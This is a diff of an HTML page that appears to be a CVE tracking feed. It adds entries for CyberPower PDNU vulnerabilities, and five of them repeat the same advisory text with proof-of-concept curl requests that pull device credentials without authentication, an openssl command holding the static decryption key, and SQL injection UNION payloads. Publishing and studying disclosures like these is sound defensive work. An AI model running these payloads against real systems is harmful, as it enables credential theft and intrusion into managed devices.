@@ -1,4 +1,4 @@
-<!-- RELEASE TIME : 2024-05-10 05:36:43 -->
+<!-- RELEASE TIME : 2024-05-10 23:37:33 -->
 <html lang="zh-cn">
 
  <head>
@@ -284,6 +284,86 @@
        <th width="5%">URL</th>
       </tr>
       <tr>
+       <td>a27d8e91cfe2d5d574808728ad8d7ea1</td>
+       <td>CVE-2024-32739</td>
+       <td>2024-05-09 14:39:13 <img src="imgs/new.gif" /></td>
+       <td>CVE-2024-32735 - Missing Authentication for Critical Function (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)An unauthenticated remote attacker can access the PDNU REST APIs. For example, the attacker can fetch sensitive information (i.e., login credentials) for devices managed by PDNU:curl '&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices' {"status":"success","results":[{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","fwversion":null,"netmask":"255.255.255.0","gateway":" \"192.168.1.1\"","usedhcp":false,"location":null,"name":null,"uptime":null,"code":null,"contact":null,"modifiedtime":null,"account":"admin","passwd":"FDA64FBAD708BA5A3CA9995A1153F4C6","iv":"90CC43284178CF848AA3CFE8C98B337C","canconn":true,"action":null,"ndtype":2}]}The encrypted password used to login (i.e., SSH) to a device can be decrypted with a static key (i.e., 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e):echo -n 'FDA64FBAD708BA5A3CA9995A1153F4C6' | xxd -p -r | openssl aes-256-cbc -d -K 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e -iv 90CC43284178CF848AA3CFE8C98B337C Password123Note that we do not a CyberPower device to be added to PDNU. &nbsp;We simulate "adding a device manually" with:a. Add a row to the devicesecret table in mcu.dbcurl -i -X PUT -H 'Content-Type:application/json' -d '{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","cmd":"submit_after_dry_run","acc":"admin","passwd":"Password123","connectionstatus":true}' "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices"b. Using the PDNU web UI, import a file with the following content, this would add a row to the rmcdevice table"Deivce Type","MAC Address","Version","Account","IP Address","DHCP","Time","Result","Up Time","Name","Location","Subnet Mask","Gateway" "2","11:22:33:44:55:66","2.2.7.0","","192.168.1.123","false", "1545027013","101","1348247500","PDU30SWT17ATNET","Server Room","255.255.255.0", "192.168.1.1" CVE-2024-32736 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_utask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public UpdateVerboseStatusResp query_utask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select uaction, ip, mac, ts, reasoningcode from ucontract join utask on ucontract.ucid = utask.contract join utaskresult on utask.utid = utaskresult.task where ucontract.ucid = '%s';", new Object[] { contract_uuid }); return (UpdateVerboseStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:# sqlite_version() = 3.21.0 curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=&amp;uid=1'%20UNION%20select%201,2,3,4,sqlite_version();--" {"status":"finished","results":[{"ip":"2","mac":"3","action":"1","ts":"4","code":"3.21.0"}]}CVE-2024-32737 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_contract_result (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public synchronized UpdateLeanStatusResp query_contract_result(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofupgradedevice, numsuccess, numfailed, modifiedtime from ucontractresult where ucontractresult.contract = '%s';", new Object[] { contract_uuid }); return (UpdateLeanStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","result":{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}}CVE-2024-32738 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_lean (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigLeanResp query_ptask_lean(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofdevice, numsuccess, numfailed, modifiedtime from pcontractresult where contract = '%s';", new Object[] { contract_uuid }); return (PdncConfigLeanResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}]}CVE-2024-32739 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigVerboseResp query_ptask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select paction, ip, ts, reasoningcode from pcontract join ptask on pcontract.pcid = ptask.contract join ptaskresult on ptask.ptid = ptaskresult.task where pcontract.pcid = '%s';", new Object[] { contract_uuid }); return (PdncConfigVerboseResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"code":"3.21.0","action":"1","ip":"2","ts":"3"}]}&nbsp;</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-32739">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>7b1bbc2dad37d3de2fd8dd27bc70a727</td>
+       <td>CVE-2024-32738</td>
+       <td>2024-05-09 14:39:13 <img src="imgs/new.gif" /></td>
+       <td>CVE-2024-32735 - Missing Authentication for Critical Function (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)An unauthenticated remote attacker can access the PDNU REST APIs. For example, the attacker can fetch sensitive information (i.e., login credentials) for devices managed by PDNU:curl '&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices' {"status":"success","results":[{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","fwversion":null,"netmask":"255.255.255.0","gateway":" \"192.168.1.1\"","usedhcp":false,"location":null,"name":null,"uptime":null,"code":null,"contact":null,"modifiedtime":null,"account":"admin","passwd":"FDA64FBAD708BA5A3CA9995A1153F4C6","iv":"90CC43284178CF848AA3CFE8C98B337C","canconn":true,"action":null,"ndtype":2}]}The encrypted password used to login (i.e., SSH) to a device can be decrypted with a static key (i.e., 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e):echo -n 'FDA64FBAD708BA5A3CA9995A1153F4C6' | xxd -p -r | openssl aes-256-cbc -d -K 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e -iv 90CC43284178CF848AA3CFE8C98B337C Password123Note that we do not a CyberPower device to be added to PDNU. &nbsp;We simulate "adding a device manually" with:a. Add a row to the devicesecret table in mcu.dbcurl -i -X PUT -H 'Content-Type:application/json' -d '{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","cmd":"submit_after_dry_run","acc":"admin","passwd":"Password123","connectionstatus":true}' "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices"b. Using the PDNU web UI, import a file with the following content, this would add a row to the rmcdevice table"Deivce Type","MAC Address","Version","Account","IP Address","DHCP","Time","Result","Up Time","Name","Location","Subnet Mask","Gateway" "2","11:22:33:44:55:66","2.2.7.0","","192.168.1.123","false", "1545027013","101","1348247500","PDU30SWT17ATNET","Server Room","255.255.255.0", "192.168.1.1" CVE-2024-32736 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_utask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public UpdateVerboseStatusResp query_utask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select uaction, ip, mac, ts, reasoningcode from ucontract join utask on ucontract.ucid = utask.contract join utaskresult on utask.utid = utaskresult.task where ucontract.ucid = '%s';", new Object[] { contract_uuid }); return (UpdateVerboseStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:# sqlite_version() = 3.21.0 curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=&amp;uid=1'%20UNION%20select%201,2,3,4,sqlite_version();--" {"status":"finished","results":[{"ip":"2","mac":"3","action":"1","ts":"4","code":"3.21.0"}]}CVE-2024-32737 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_contract_result (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public synchronized UpdateLeanStatusResp query_contract_result(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofupgradedevice, numsuccess, numfailed, modifiedtime from ucontractresult where ucontractresult.contract = '%s';", new Object[] { contract_uuid }); return (UpdateLeanStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","result":{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}}CVE-2024-32738 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_lean (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigLeanResp query_ptask_lean(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofdevice, numsuccess, numfailed, modifiedtime from pcontractresult where contract = '%s';", new Object[] { contract_uuid }); return (PdncConfigLeanResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}]}CVE-2024-32739 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigVerboseResp query_ptask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select paction, ip, ts, reasoningcode from pcontract join ptask on pcontract.pcid = ptask.contract join ptaskresult on ptask.ptid = ptaskresult.task where pcontract.pcid = '%s';", new Object[] { contract_uuid }); return (PdncConfigVerboseResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"code":"3.21.0","action":"1","ip":"2","ts":"3"}]}&nbsp;</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-32738">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>6e9f94d522f92f12b163aaa3088901da</td>
+       <td>CVE-2024-32737</td>
+       <td>2024-05-09 14:39:13 <img src="imgs/new.gif" /></td>
+       <td>CVE-2024-32735 - Missing Authentication for Critical Function (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)An unauthenticated remote attacker can access the PDNU REST APIs. For example, the attacker can fetch sensitive information (i.e., login credentials) for devices managed by PDNU:curl '&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices' {"status":"success","results":[{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","fwversion":null,"netmask":"255.255.255.0","gateway":" \"192.168.1.1\"","usedhcp":false,"location":null,"name":null,"uptime":null,"code":null,"contact":null,"modifiedtime":null,"account":"admin","passwd":"FDA64FBAD708BA5A3CA9995A1153F4C6","iv":"90CC43284178CF848AA3CFE8C98B337C","canconn":true,"action":null,"ndtype":2}]}The encrypted password used to login (i.e., SSH) to a device can be decrypted with a static key (i.e., 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e):echo -n 'FDA64FBAD708BA5A3CA9995A1153F4C6' | xxd -p -r | openssl aes-256-cbc -d -K 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e -iv 90CC43284178CF848AA3CFE8C98B337C Password123Note that we do not a CyberPower device to be added to PDNU. &nbsp;We simulate "adding a device manually" with:a. Add a row to the devicesecret table in mcu.dbcurl -i -X PUT -H 'Content-Type:application/json' -d '{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","cmd":"submit_after_dry_run","acc":"admin","passwd":"Password123","connectionstatus":true}' "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices"b. Using the PDNU web UI, import a file with the following content, this would add a row to the rmcdevice table"Deivce Type","MAC Address","Version","Account","IP Address","DHCP","Time","Result","Up Time","Name","Location","Subnet Mask","Gateway" "2","11:22:33:44:55:66","2.2.7.0","","192.168.1.123","false", "1545027013","101","1348247500","PDU30SWT17ATNET","Server Room","255.255.255.0", "192.168.1.1" CVE-2024-32736 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_utask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public UpdateVerboseStatusResp query_utask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select uaction, ip, mac, ts, reasoningcode from ucontract join utask on ucontract.ucid = utask.contract join utaskresult on utask.utid = utaskresult.task where ucontract.ucid = '%s';", new Object[] { contract_uuid }); return (UpdateVerboseStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:# sqlite_version() = 3.21.0 curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=&amp;uid=1'%20UNION%20select%201,2,3,4,sqlite_version();--" {"status":"finished","results":[{"ip":"2","mac":"3","action":"1","ts":"4","code":"3.21.0"}]}CVE-2024-32737 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_contract_result (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public synchronized UpdateLeanStatusResp query_contract_result(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofupgradedevice, numsuccess, numfailed, modifiedtime from ucontractresult where ucontractresult.contract = '%s';", new Object[] { contract_uuid }); return (UpdateLeanStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","result":{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}}CVE-2024-32738 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_lean (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigLeanResp query_ptask_lean(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofdevice, numsuccess, numfailed, modifiedtime from pcontractresult where contract = '%s';", new Object[] { contract_uuid }); return (PdncConfigLeanResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}]}CVE-2024-32739 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigVerboseResp query_ptask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select paction, ip, ts, reasoningcode from pcontract join ptask on pcontract.pcid = ptask.contract join ptaskresult on ptask.ptid = ptaskresult.task where pcontract.pcid = '%s';", new Object[] { contract_uuid }); return (PdncConfigVerboseResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"code":"3.21.0","action":"1","ip":"2","ts":"3"}]}&nbsp;</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-32737">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>f486f5821b787845892a6e39c1db5123</td>
+       <td>CVE-2024-32736</td>
+       <td>2024-05-09 14:39:13 <img src="imgs/new.gif" /></td>
+       <td>CVE-2024-32735 - Missing Authentication for Critical Function (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)An unauthenticated remote attacker can access the PDNU REST APIs. For example, the attacker can fetch sensitive information (i.e., login credentials) for devices managed by PDNU:curl '&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices' {"status":"success","results":[{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","fwversion":null,"netmask":"255.255.255.0","gateway":" \"192.168.1.1\"","usedhcp":false,"location":null,"name":null,"uptime":null,"code":null,"contact":null,"modifiedtime":null,"account":"admin","passwd":"FDA64FBAD708BA5A3CA9995A1153F4C6","iv":"90CC43284178CF848AA3CFE8C98B337C","canconn":true,"action":null,"ndtype":2}]}The encrypted password used to login (i.e., SSH) to a device can be decrypted with a static key (i.e., 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e):echo -n 'FDA64FBAD708BA5A3CA9995A1153F4C6' | xxd -p -r | openssl aes-256-cbc -d -K 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e -iv 90CC43284178CF848AA3CFE8C98B337C Password123Note that we do not a CyberPower device to be added to PDNU. &nbsp;We simulate "adding a device manually" with:a. Add a row to the devicesecret table in mcu.dbcurl -i -X PUT -H 'Content-Type:application/json' -d '{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","cmd":"submit_after_dry_run","acc":"admin","passwd":"Password123","connectionstatus":true}' "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices"b. Using the PDNU web UI, import a file with the following content, this would add a row to the rmcdevice table"Deivce Type","MAC Address","Version","Account","IP Address","DHCP","Time","Result","Up Time","Name","Location","Subnet Mask","Gateway" "2","11:22:33:44:55:66","2.2.7.0","","192.168.1.123","false", "1545027013","101","1348247500","PDU30SWT17ATNET","Server Room","255.255.255.0", "192.168.1.1" CVE-2024-32736 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_utask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public UpdateVerboseStatusResp query_utask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select uaction, ip, mac, ts, reasoningcode from ucontract join utask on ucontract.ucid = utask.contract join utaskresult on utask.utid = utaskresult.task where ucontract.ucid = '%s';", new Object[] { contract_uuid }); return (UpdateVerboseStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:# sqlite_version() = 3.21.0 curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=&amp;uid=1'%20UNION%20select%201,2,3,4,sqlite_version();--" {"status":"finished","results":[{"ip":"2","mac":"3","action":"1","ts":"4","code":"3.21.0"}]}CVE-2024-32737 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_contract_result (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public synchronized UpdateLeanStatusResp query_contract_result(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofupgradedevice, numsuccess, numfailed, modifiedtime from ucontractresult where ucontractresult.contract = '%s';", new Object[] { contract_uuid }); return (UpdateLeanStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","result":{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}}CVE-2024-32738 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_lean (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigLeanResp query_ptask_lean(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofdevice, numsuccess, numfailed, modifiedtime from pcontractresult where contract = '%s';", new Object[] { contract_uuid }); return (PdncConfigLeanResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}]}CVE-2024-32739 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigVerboseResp query_ptask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select paction, ip, ts, reasoningcode from pcontract join ptask on pcontract.pcid = ptask.contract join ptaskresult on ptask.ptid = ptaskresult.task where pcontract.pcid = '%s';", new Object[] { contract_uuid }); return (PdncConfigVerboseResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"code":"3.21.0","action":"1","ip":"2","ts":"3"}]}&nbsp;</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-32736">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>f606bb9dae89374af144dd7feb6599fe</td>
+       <td>CVE-2024-32735</td>
+       <td>2024-05-09 14:39:13 <img src="imgs/new.gif" /></td>
+       <td>CVE-2024-32735 - Missing Authentication for Critical Function (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)An unauthenticated remote attacker can access the PDNU REST APIs. For example, the attacker can fetch sensitive information (i.e., login credentials) for devices managed by PDNU:curl '&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices' {"status":"success","results":[{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","fwversion":null,"netmask":"255.255.255.0","gateway":" \"192.168.1.1\"","usedhcp":false,"location":null,"name":null,"uptime":null,"code":null,"contact":null,"modifiedtime":null,"account":"admin","passwd":"FDA64FBAD708BA5A3CA9995A1153F4C6","iv":"90CC43284178CF848AA3CFE8C98B337C","canconn":true,"action":null,"ndtype":2}]}The encrypted password used to login (i.e., SSH) to a device can be decrypted with a static key (i.e., 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e):echo -n 'FDA64FBAD708BA5A3CA9995A1153F4C6' | xxd -p -r | openssl aes-256-cbc -d -K 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e -iv 90CC43284178CF848AA3CFE8C98B337C Password123Note that we do not a CyberPower device to be added to PDNU. &nbsp;We simulate "adding a device manually" with:a. Add a row to the devicesecret table in mcu.dbcurl -i -X PUT -H 'Content-Type:application/json' -d '{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","cmd":"submit_after_dry_run","acc":"admin","passwd":"Password123","connectionstatus":true}' "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices"b. Using the PDNU web UI, import a file with the following content, this would add a row to the rmcdevice table"Deivce Type","MAC Address","Version","Account","IP Address","DHCP","Time","Result","Up Time","Name","Location","Subnet Mask","Gateway" "2","11:22:33:44:55:66","2.2.7.0","","192.168.1.123","false", "1545027013","101","1348247500","PDU30SWT17ATNET","Server Room","255.255.255.0", "192.168.1.1" CVE-2024-32736 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_utask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public UpdateVerboseStatusResp query_utask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select uaction, ip, mac, ts, reasoningcode from ucontract join utask on ucontract.ucid = utask.contract join utaskresult on utask.utid = utaskresult.task where ucontract.ucid = '%s';", new Object[] { contract_uuid }); return (UpdateVerboseStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:# sqlite_version() = 3.21.0 curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=&amp;uid=1'%20UNION%20select%201,2,3,4,sqlite_version();--" {"status":"finished","results":[{"ip":"2","mac":"3","action":"1","ts":"4","code":"3.21.0"}]}CVE-2024-32737 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_contract_result (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public synchronized UpdateLeanStatusResp query_contract_result(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofupgradedevice, numsuccess, numfailed, modifiedtime from ucontractresult where ucontractresult.contract = '%s';", new Object[] { contract_uuid }); return (UpdateLeanStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","result":{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}}CVE-2024-32738 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_lean (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigLeanResp query_ptask_lean(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofdevice, numsuccess, numfailed, modifiedtime from pcontractresult where contract = '%s';", new Object[] { contract_uuid }); return (PdncConfigLeanResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}]}CVE-2024-32739 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigVerboseResp query_ptask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select paction, ip, ts, reasoningcode from pcontract join ptask on pcontract.pcid = ptask.contract join ptaskresult on ptask.ptid = ptaskresult.task where pcontract.pcid = '%s';", new Object[] { contract_uuid }); return (PdncConfigVerboseResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"code":"3.21.0","action":"1","ip":"2","ts":"3"}]}&nbsp;</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-32735">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>6fbd157bffa789486496b54333363332</td>
+       <td>CVE-2024-4701</td>
+       <td>2024-05-09 00:00:00 <img src="imgs/new.gif" /></td>
+       <td>Any Genie OSS users running their own instance and relying on the filesystem to store file attachments submitted to the Genie application may be impacted. Using this technique, it is possible to write a file with any user-specified filename and file contents to any location on the file system that the Java process has write access - potentially leading to remote code execution (RCE).Genie users who do not store these attachments locally on the underlying file system are not vulnerable to this issue.</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-4701">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>fbf57e564fb972b301dd5245a6d8720c</td>
+       <td>CVE-2024-4671</td>
+       <td>2024-05-09 00:00:00 <img src="imgs/new.gif" /></td>
+       <td>Use after free in Visuals.</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-4671">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>5fe3ba590ed718fd37e5b734ea76b5b5</td>
+       <td>CVE-2024-4597</td>
+       <td>2024-05-09 00:00:00 <img src="imgs/new.gif" /></td>
